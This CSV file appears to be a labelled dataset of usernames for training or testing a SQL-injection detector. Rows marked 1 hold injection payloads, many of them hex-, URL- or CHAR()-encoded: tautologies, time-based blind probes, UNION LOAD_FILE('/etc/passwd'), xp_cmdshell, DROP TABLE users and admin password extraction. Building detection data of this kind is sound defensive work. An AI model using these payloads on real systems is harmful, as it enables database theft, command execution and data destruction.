name,is_malicious
donnaowens0x270x200x410x4e0x440x200x280x530x450x4c0x450x430x540x200x310x200x460x520x4f0x4d0x280x530x450x4c0x450x430x540x200x430x4f0x550x4e0x540x280x2a0x290x2c0x430x4f0x4e0x430x410x540x280x300x780x330x610x2c0x280x530x450x4c0x450x430x540x200x430x550x520x520x450x4e0x540x5f0x550x530x450x520x280x290x290x2c0x300x780x330x610x2c0x460x4c0x4f0x4f0x520x280x520x410x4e0x440x280x300x290x2a0x320x290x290x780x200x460x520x4f0x4d0x200x490x4e0x460x4f0x520x4d0x410x540x490x4f0x4e0x5f0x530x430x480x450x4d0x410x2e0x500x4c0x550x470x490x4e0x530x200x470x520x4f0x550x500x200x420x590x200x780x290x610x290x2d0x2d,1
raven51,0
yangchristy,0
christinehardin,0
qoconnell,0
jberry,0
aaronthomas,0
troberts,0
lori71,0
cameron10,0
hopkinsmatthew,0
barbara35,0
jamesflores,0
michele01,0
ritataylor,0
shelleywilson,0
kunderwood,0
joshuahoover,0
linda96,0
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
'; EXEC xp_cmdshell('dir')--,1
perry01,0
marcusdorsey,0
tammy54,0
ysheppard,0
josephzimmerman,0
scottavila,0
adam66,0
shelley87,0
molly92,0
deannarodriguez,0
millerlisa,0
bsoto,0
mjones,0
vincent09'; EXEC xp_cmdshell('dir')--,1
pvelasquez,0
lbrewer,0
brianthomas,0
tchoi,0
kramos,0
omejia,0
cynthia42,0
juliesmith,0
guerrerocandace,0
walkermark,0
markandersen,0
carrillodaniel,0
carlos27,0
karenhowell,0
'/**/OR/**/'1'='1,1
0x270x7c0x7c0x270x310x270x3d0x270x31,1
joneslisa0x270x200x550x4e0x490x4f0x4e0x200x410x4c0x4c0x200x530x450x4c0x450x430x540x200x4c0x4f0x410x440x5f0x460x490x4c0x450x280x270x2f0x650x740x630x2f0x700x610x730x730x770x640x270x290x2d0x2d,1
brianmoore,0
khines,0
natasha30,0
bgordon,0
christopherjames,0
marcus08,0
ronald54,0
smoss,0
angelaturner,0
fswanson,0
donna99,0
lisafisher,0
lauren80,0
grahamdale,0
' OR BINARY 'a'='a'--,1
jacobrich,0
laura84,0
tammy71,0
joseph70,0
andersonashley'%20OR%201=1--,1
%27%25%32%30%4f%52%25%32%30%31%3d%31--,1
mitchell10,0
anitaramirez,0
traci86,0
andersonian,0
starkjasmin,0
danielabbott,0
%27%2f%2a%2a%2f%4f%52%2f%2a%2a%2f%27%31%27%3d%27%31,1
ffleming,0
ryanburns,0
katherine96,0
martincheryl,0
mcgeematthew,0
trevor70,0
mhunt,0
warnerannette,0
qscott,0
%27 %4f%52 %42%49%4e%41%52%59 %27%61%27%3d%27%61%27--,1
colinjohnson,0
catherine64,0
holderkara,0
drew62,0
nguyenamanda,0
brian62,0
christopher85,0
jberg,0
gwalker,0
ulindsey,0
sfoster,0
stephen13,0
bradley45,0
catherine32,0
jonesmatthew,0
adam56,0
emily06,0
jcruz,0
"' OR BENCHMARK(10000000,MD5(NOW()))--",1
tiffany53CHAR(39)CHAR(124)CHAR(124)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
edwardsmason,0
williamsjeanette,0
beltrankathryn,0
zwilliams,0
melinda60,0
christopher13,0
jayjenkins,0
laurachavez,0
nguyenalexander,0
jhodge,0
"ooliver' OR BENCHMARK(10000000,MD5(NOW()))--",1
larnoldCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(42)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(40)CHAR(83)CHAR(76)CHAR(69)CHAR(69)CHAR(80)CHAR(40)CHAR(53)CHAR(41)CHAR(41)CHAR(41)CHAR(98)CHAR(65)CHAR(75)CHAR(76)CHAR(41)CHAR(45)CHAR(45),1
carolinemejia,0
knelson' OR SOUNDEX('test')=SOUNDEX('test')--,1
' OR '1'='1,1
oscar49,0
phillipscurtis,0
catherineluna,0
millermary,0
ireed,0
anthony99,0
moralesrobert,0
katherine50,0
joseph82,0
johnsonashley,0
awise,0
ktravis,0
' OR SOUNDEX('test')=SOUNDEX('test')--,1
nsherman,0
fbryan,0
amandaday,0
evanwilliamson' OR SOUNDEX('test')=SOUNDEX('test')--,1
moorefrank,0
sharris,0
malonealexandra,0
steven35,0
alexanderhiggins,0
larsendonna,0
christianharrington,0
edwardsmatthew,0
sara51,0
johnsmith,0
smcdonald,0
jennifergreen,0
tmcdonald,0
cory07,0
smithjerry,0
%27 %4f%52 %30%78%35%30%3d%30%78%35%30--,1
michelle81,0
ramirezbradley,0
alexis21,0
biancarussell,0
oconnellcarolyn,0
edwardsjessica' OR CHAR(49)=CHAR(49)--,1
timothy19,0
nielsenmary,0
william40,0
theresasampson,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(42)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(40)CHAR(83)CHAR(76)CHAR(69)CHAR(69)CHAR(80)CHAR(40)CHAR(53)CHAR(41)CHAR(41)CHAR(41)CHAR(98)CHAR(65)CHAR(75)CHAR(76)CHAR(41)CHAR(45)CHAR(45),1
scott84,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
newtonaaron,0
josesnyder,0
gtorres,0
jacqueline98CHAR(39)CHAR(32)CHAR(65)CHAR(78)CHAR(68)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(49)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(67)CHAR(79)CHAR(85)CHAR(78)CHAR(84)CHAR(40)CHAR(42)CHAR(41)CHAR(44)CHAR(67)CHAR(79)CHAR(78)CHAR(67)CHAR(65)CHAR(84)CHAR(40)CHAR(48)CHAR(120)CHAR(51)CHAR(97)CHAR(44)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(67)CHAR(85)CHAR(82)CHAR(82)CHAR(69)CHAR(78)CHAR(84)CHAR(95)CHAR(85)CHAR(83)CHAR(69)CHAR(82)CHAR(40)CHAR(41)CHAR(41)CHAR(44)CHAR(48)CHAR(120)CHAR(51)CHAR(97)CHAR(44)CHAR(70)CHAR(76)CHAR(79)CHAR(79)CHAR(82)CHAR(40)CHAR(82)CHAR(65)CHAR(78)CHAR(68)CHAR(40)CHAR(48)CHAR(41)CHAR(42)CHAR(50)CHAR(41)CHAR(41)CHAR(120)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(73)CHAR(78)CHAR(70)CHAR(79)CHAR(82)CHAR(77)CHAR(65)CHAR(84)CHAR(73)CHAR(79)CHAR(78)CHAR(95)CHAR(83)CHAR(67)CHAR(72)CHAR(69)CHAR(77)CHAR(65)CHAR(46)CHAR(80)CHAR(76)CHAR(85)CHAR(71)CHAR(73)CHAR(78)CHAR(83)CHAR(32)CHAR(71)CHAR(82)CHAR(79)CHAR(85)CHAR(80)CHAR(32)CHAR(66)CHAR(89)CHAR(32)CHAR(120)CHAR(41)CHAR(97)CHAR(41)CHAR(45)CHAR(45),1
"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
edwardclay,0
william00,0
yray,0
susanjackson0x270x7c0x7c0x270x310x270x3d0x270x31,1
"kevin21' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
matthewsdiane,0
sanchezapril'%27%20OR%201=1--,1
kristie92,0
CHAR(39)CHAR(124)CHAR(124)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
mitchellclayton' OR 0x50=0x50--,1
garciajonathan,0
jordanbarron,0
stevenmclean,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
rachel38,0
christopher92,0
glasslarry,0
'/**/OR/**/'1'='1,1
michaelaguilar,0
' OR '1'='1,1
brenda81,0
hermankim,0
amoore,0
victor35,0
millerdennis,0
wdickson,0
ramosmichael,0
robert54,0
douglas16,0
qgilbert,0
clarkjames,0
williamblack,0
samantha42,0
ashley99,0
patriciadodson,0
jacobkelly,0
william80,0
jessica55,0
vmunoz,0
smarshall,0
laura57,0
steven50,0
mwalters,0
osoto,0
sydney08,0
cpowell,0
ecabrera,0
riosamy,0
mahoneyjames,0
simonryan,0
rachel14,0
zdonovan,0
tamarawarner,0
aliceperry,0
ashleynicholas,0
vschmidt,0
zdiaz,0
janet19,0
eingram,0
angelaaguilar,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(66)CHAR(69)CHAR(78)CHAR(67)CHAR(72)CHAR(77)CHAR(65)CHAR(82)CHAR(75)CHAR(40)CHAR(49)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(44)CHAR(77)CHAR(68)CHAR(53)CHAR(40)CHAR(78)CHAR(79)CHAR(87)CHAR(40)CHAR(41)CHAR(41)CHAR(41)CHAR(45)CHAR(45),1
oskinner' OR SOUNDEX('test')=SOUNDEX('test')--,1
tcowan0x270x200x550x4e0x490x4f0x4e0x200x410x4c0x4c0x200x530x450x4c0x450x430x540x200x4c0x4f0x410x440x5f0x460x490x4c0x450x280x270x2f0x650x740x630x2f0x700x610x730x730x770x640x270x290x2d0x2d,1
kmoralesCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(48)CHAR(120)CHAR(53)CHAR(48)CHAR(61)CHAR(48)CHAR(120)CHAR(53)CHAR(48)CHAR(45)CHAR(45),1
lewisbrandon,0
osullivan,0
marthacook,0
eric54,0
aaron98,0
hilltimothy,0
jason22,0
heathercastro,0
' OR 1=1--,1
catherinegomez,0
hansonbrian,0
nathan18,0
lmoore,0
scott93,0
lindseychristine,0
goneal,0
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
bwhite,0
shawnmurray,0
bhoover,0
rpratt,0
daniel91,0
susan62,0
cassieholmes,0
wbutler,0
jessica14,0
kristina24,0
mccormickandrea,0
johnmiller,0
jamesfrazier,0
mcdanielscott0x270x200x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x2a0x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d,1
zruiz,0
wayne92CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(66)CHAR(73)CHAR(78)CHAR(65)CHAR(82)CHAR(89)CHAR(32)CHAR(39)CHAR(97)CHAR(39)CHAR(61)CHAR(39)CHAR(97)CHAR(39)CHAR(45)CHAR(45),1
llang,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(48)CHAR(120)CHAR(53)CHAR(48)CHAR(61)CHAR(48)CHAR(120)CHAR(53)CHAR(48)CHAR(45)CHAR(45),1
thomasharvey,0
perezsarah,0
heather72,0
amy35,0
amyjacobs,0
timothywilliams,0
paula46,0
johnjohnson,0
ndillon,0
danielgreen,0
zgraham,0
"' OR BENCHMARK(10000000,MD5(NOW()))--",1
colejeff,0
' OR CHAR(49)=CHAR(49)--,1
sherri37,0
karenrichardson,0
ureese,0
robert72'; EXEC xp_cmdshell('dir')--,1
nancy80,0
stewartdouglas,0
"laura95'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
evansjulia,0
orandolph,0
abarnes,0
%27 %4f%52 %31%3d%31--,1
anthony68,0
turnerheather,0
ann60,0
aberry' OR 0x50=0x50--,1
' OR CHAR(49)=CHAR(49)--,1
%27%25%32%30%4f%52%25%32%30%31%3d%31--,1
xwalker,0
kinglaura,0
bcarter,0
josephcolon,0
qschmidt,0
'||'1'='1,1
ryan15,0
taylorwatson,0
twatkins,0
michaelmcdonald,0
ellispaula,0
rachel86,0
wzimmerman,0
' OR CHAR(49)=CHAR(49)--,1
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(66)CHAR(69)CHAR(78)CHAR(67)CHAR(72)CHAR(77)CHAR(65)CHAR(82)CHAR(75)CHAR(40)CHAR(49)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(44)CHAR(77)CHAR(68)CHAR(53)CHAR(40)CHAR(78)CHAR(79)CHAR(87)CHAR(40)CHAR(41)CHAR(41)CHAR(41)CHAR(45)CHAR(45),1
jennifer74,0
joshuabaker,0
suzannebrown,0
reidmary,0
willie94,0
leedonald,0
andersonbrianna,0
"yarnold'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
klogan,0
steven42,0
tiffany46,0
hicksdouglas,0
kevin41,0
jeremy97,0
' OR '1'='1,1
aaron41,0
sallysmith,0
' OR CHAR(49)=CHAR(49)--,1
brandoncopeland,0
kristy87,0
' OR 1=1--,1
rachel66,0
acampbell,0
zdavidson,0
teresa77,0
robin40,0
aallen,0
lowecatherine,0
xharris,0
schmidthannah,0
taylor42,0
meagan25,0
ritablackwell,0
timothyabbott,0
robertscott,0
robertskelly,0
kfields,0
khodge,0
paige93,0
bridget98,0
wsullivan,0
reyesdaniel,0
emanning,0
rharrison,0
middletongeoffrey,0
alexandria62,0
ingramjonathan,0
csparks,0
brenda46,0
john70,0
karen34,0
yjones,0
' OR 0x50=0x50--,1
jdavies,0
hendersonaaron,0
davidhernandez,0
barajaskevin,0
tiffanyclark,0
ryanstephanie,0
zprice,0
masseyjesus,0
hickskristin,0
nolangregory,0
ykey,0
nicholsdonald,0
thomas45,0
maryjacobs,0
tom07,0
greenamber,0
lambertmelissa,0
carolyn81,0
nicole20'||'1'='1,1
brandonsmith,0
rphelps,0
uroach' OR CHAR(49)=CHAR(49)--,1
goodmanalbert,0
derek18,0
crawfordjeffrey,0
angelacuevas,0
simmonsveronica,0
wolfandrew,0
tammy66,0
haleyrussell,0
coltonhenson,0
james66,0
andersondiana,0
uhenderson,0
"bethanygarcia'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
robertwilliams,0
idunlap,0
susanrobinson,0
popealexandra,0
unelson,0
jameswarren,0
ylivingston,0
johnsondavid,0
tannermeghan,0
stephanie14,0
fosterjessica,0
johnrosario,0
phoffman,0
framirez,0
robertastewart,0
sara36,0
nguyenpatrick,0
devinmccormick,0
boydcindy,0
christophergreen,0
kwheeler,0
thompsonbrandon,0
kim75,0
rogersmandyCHAR(39)CHAR(124)CHAR(124)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
nelsonzachary,0
taylordonald,0
torresdustin,0
montgomerywhitney,0
barajasalexis,0
glen34,0
xlowe,0
john66,0
thomas59,0
mckeebenjamin,0
ohanson'%27%20OR%201=1--,1
dianahenry,0
upineda,0
rebecca26,0
michelle57,0
robinwarner,0
ndowns,0
shelley53,0
jill91,0
tdiaz,0
randalldoyle,0
wardmichael'; DROP TABLE users--,1
' OR '1'='1,1
padillasheri,0
"pamela73' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
georgegarner,0
greenegrant,0
jessica64,0
woodsbrent,0
wthomas,0
shelbysanchez,0
hullsummer,0
dananguyen,0
yortiz,0
mcconnellian,0
gordoncharles,0
dawnjohnston,0
michellepeterson,0
patricia17,0
gary29,0
jessica94,0
smorton,0
ellisamanda,0
jonathan01,0
taylorwilliams,0
tanyabentley,0
bwoods,0
stephenbooth,0
kscott,0
barbarabaker,0
gutierrezluke,0
catherine27,0
xpotter,0
' OR BINARY 'a'='a'--,1
' OR 0x50=0x50--,1
"' OR BENCHMARK(10000000,MD5(NOW()))--",1
diana42,0
robert57,0
juan14,0
' OR BINARY 'a'='a'--,1
brownmisty,0
ywilson,0
fmorris,0
christopher16,0
michelle98,0
pbrown,0
reynoldskristopher,0
doylejennifer,0
toddlogan,0
collinsrebekah,0
' OR 1=1--,1
'||'1'='1,1
xfranklin,0
tonya77,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
pfernandez,0
jade25,0
hhernandezCHAR(39)CHAR(59)CHAR(32)CHAR(69)CHAR(88)CHAR(69)CHAR(67)CHAR(32)CHAR(120)CHAR(112)CHAR(95)CHAR(99)CHAR(109)CHAR(100)CHAR(115)CHAR(104)CHAR(101)CHAR(108)CHAR(108)CHAR(40)CHAR(39)CHAR(100)CHAR(105)CHAR(114)CHAR(39)CHAR(41)CHAR(45)CHAR(45),1
grodriguez,0
castanedaheather,0
damon19,0
russoelizabeth,0
tracy40,0
0x270x2f0x2a0x2a0x2f0x4f0x520x2f0x2a0x2a0x2f0x270x310x270x3d0x270x31,1
holly55,0
xmcknight'; DROP TABLE users--,1
joe66,0
jennifer12,0
jasmine80,0
kbrooks,0
ucantrell,0
' UNION SELECT * FROM users--,1
zharrington,0
omitchell,0
qrichmond,0
istevens,0
munozwilliam,0
tgrimes0x270x2b0x280x530x450x4c0x450x430x540x200x270x300x270x200x460x520x4f0x4d0x200x750x730x650x720x730x200x570x480x450x520x450x200x750x730x650x720x6e0x610x6d0x650x3d0x270x610x640x6d0x690x6e0x270x200x410x4e0x440x200x530x550x420x530x540x520x490x4e0x470x280x700x610x730x730x770x6f0x720x640x2c0x310x2c0x310x290x3d0x270x610x270x290x2b0x27,1
carolynjackson'||'1'='1,1
'/**/OR/**/'1'='1,1
robinsonbrian,0
hillkathryn,0
shannonwilson,0
stephanie39,0
dustinrogers,0
levi05,0
' OR SOUNDEX('test')=SOUNDEX('test')--,1
younggabriel,0
melissaowens,0
rogerjones,0
erik72,0
charleslee,0
jmoore,0
obaker%27%3b %45%58%45%43 %78%70%5f%63%6d%64%73%68%65%6c%6c%28%27%64%69%72%27%29--,1
annettedoyle,0
carolwalls,0
donnaperez,0
justin09,0
rgarcia%27%7c%7c%27%31%27%3d%27%31,1
lperkins,0
wshannon,0
oyang,0
milleranthony,0
michael92,0
adamsdaniel,0
xoneal,0
gracecastro,0
stacey19,0
jameswalker0x270x200x4f0x520x200x430x480x410x520x280x340x390x290x3d0x430x480x410x520x280x340x390x290x2d0x2d,1
thorntonmichelle,0
meyermark,0
"robertsondiana'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
%27%2b%28%53%45%4c%45%43%54 %27%30%27 %46%52%4f%4d %75%73%65%72%73 %57%48%45%52%45 %75%73%65%72%6e%61%6d%65%3d%27%61%64%6d%69%6e%27 %41%4e%44 %53%55%42%53%54%52%49%4e%47%28%70%61%73%73%77%6f%72%64%2c%31%2c%31%29%3d%27%61%27%29%2b%27,1
allenamanda,0
edwardweber,0
'%20OR%201=1--,1
ryan30,0
CHAR(39)CHAR(37)CHAR(50)CHAR(48)CHAR(79)CHAR(82)CHAR(37)CHAR(50)CHAR(48)CHAR(49)CHAR(61)CHAR(49)CHAR(45)CHAR(45),1
cnelson,0
watersjohn,0
donaldosborn,0
danielterry,0
parkscynthia,0
tammymoody,0
pjoseph,0
moorejohn,0
cainjennifer,0
0x270x200x4f0x520x200x280x530x450x4c0x450x430x540x200x2a0x200x460x520x4f0x4d0x200x280x530x450x4c0x450x430x540x280x530x4c0x450x450x500x280x350x290x290x290x620x410x4b0x4c0x290x2d0x2d,1
tanderson,0
william04,0
omarleon,0
krista12,0
amandapatrick,0
scott12,0
amanda69,0
' OR CHAR(49)=CHAR(49)--,1
sheri07,0
edward26,0
jessicalivingston%27%2b%28%53%45%4c%45%43%54 %27%30%27 %46%52%4f%4d %75%73%65%72%73 %57%48%45%52%45 %75%73%65%72%6e%61%6d%65%3d%27%61%64%6d%69%6e%27 %41%4e%44 %53%55%42%53%54%52%49%4e%47%28%70%61%73%73%77%6f%72%64%2c%31%2c%31%29%3d%27%61%27%29%2b%27,1
CHAR(39)CHAR(32)CHAR(85)CHAR(78)CHAR(73)CHAR(79)CHAR(78)CHAR(32)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(42)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(115)CHAR(45)CHAR(45),1
' OR SOUNDEX('test')=SOUNDEX('test')--,1
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
dsanders,0
kathleenzimmerman,0
mgates,0
nicole45,0
karen67,0
alyssarobles,0
qjackson,0
thomastina' OR BINARY 'a'='a'--,1
amy28,0
woodardbrenda,0
heather82,0
sarahswanson,0
jessica30,0
lauren97,0
hunttimothy%27 %4f%52 %42%45%4e%43%48%4d%41%52%4b%28%31%30%30%30%30%30%30%30%2c%4d%44%35%28%4e%4f%57%28%29%29%29--,1
imitchell,0
johnsonrebecca,0
fwarren,0
vaughndawn,0
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
jonathanstone,0
mhernandez,0
stephen06,0
steeleelizabeth%27%2f%2a%2a%2f%4f%52%2f%2a%2a%2f%27%31%27%3d%27%31,1
chorn,0
krista69,0
brianramsey,0
edwardsamy,0
michael82,0
trevortaylor,0
matthewpeterson,0
cynthiasimmons,0
medinawesley,0
richardflowers,0
collierdeborah,0
gomezrichard,0
samuel50,0
gina74,0
gregorysmith,0
mezadonald,0
robertmorris,0
mitchelllindsay,0
frank75,0
pdiaz,0
xmathews,0
justinlopez,0
amanda10,0
philip29,0
ochoathomas,0
erikaallison,0
crawfordclaudia,0
'; EXEC xp_cmdshell('dir')--,1
olsondana,0
thomaswilliamson,0
mpollard,0
williamlutz,0
jasondavies,0
williamfoster,0
martinezalejandro,0
matthewjones,0
andreahill,0
'%27%20OR%201=1--,1
